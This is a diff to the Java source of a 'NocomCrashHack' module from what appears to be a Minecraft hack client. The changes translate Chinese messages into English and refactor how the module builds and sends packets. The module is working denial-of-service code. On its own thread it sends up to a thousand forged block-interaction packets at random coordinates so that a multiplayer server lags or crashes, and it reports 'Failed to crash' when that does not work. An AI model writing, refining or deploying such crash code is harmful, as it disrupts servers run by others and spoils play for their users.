@@ -11,6 +11,7 @@ import java.text.NumberFormat;
 import java.util.Locale;
 import java.util.Random;
 
+import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
 import net.minecraft.util.Hand;
 import net.minecraft.util.hit.BlockHitResult;
 import net.minecraft.util.math.BlockPos;
@@ -30,12 +31,12 @@ public final class NocomCrashHack extends Hack
 	private final Random random = new Random();
 	
 	private final SliderSetting packets =
-		new SliderSetting("数据包", "要发送的数据包数.", 500, 1,
+		new SliderSetting("Packets", "The number of packets to send.", 500, 1,
 			1000, 1, ValueDisplay.INTEGER);
 	
 	public NocomCrashHack()
 	{
-		super("无受伤镜头");
+		super("NocomCrash");
 		setCategory(Category.OTHER);
 		addSetting(packets);
 	}
@@ -46,19 +47,19 @@ public final class NocomCrashHack extends Hack
 		String seconds = NumberFormat.getNumberInstance(Locale.ENGLISH)
 			.format(packets.getValueI() / 100.0);
 		ChatUtils.message(
-			"发送数据包。 大约需要" + seconds + "s.");
+			"Sending packets. Will take approximately " + seconds + "s.");
 		
 		Thread thread = new Thread(() -> {
 			
 			try
 			{
 				sendPackets(packets.getValueI());
-				ChatUtils.message("完成发送，服务器应该开始滞后");
+				ChatUtils.message("Done sending, server should start to lag");
 				
 			}catch(Exception e)
 			{
 				e.printStackTrace();
-				ChatUtils.error("撞车失败，被抓 "
+				ChatUtils.error("Failed to crash, caught "
 					+ e.getClass().getSimpleName() + ".");
 			}
 			setEnabled(false);
@@ -81,18 +82,19 @@ public final class NocomCrashHack extends Hack
 			
 			Thread.sleep(10);
 			
-			sendNocomPacket();
+			// generate and send the packet
+			PlayerInteractBlockC2SPacket packet = createNocomPacket();
+			MC.getNetworkHandler().sendPacket(packet);
 		}
 	}
 	
-	public void sendNocomPacket()
+	public PlayerInteractBlockC2SPacket createNocomPacket()
 	{
 		Vec3d pos = pickRandomPos();
 		BlockHitResult blockHitResult =
 			new BlockHitResult(pos, Direction.DOWN, new BlockPos(pos), false);
 		
-		IMC.getInteractionManager()
-			.sendPlayerInteractBlockPacket(Hand.MAIN_HAND, blockHitResult);
+		return new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, blockHitResult);
 	}
 	
 	private Vec3d pickRandomPos()
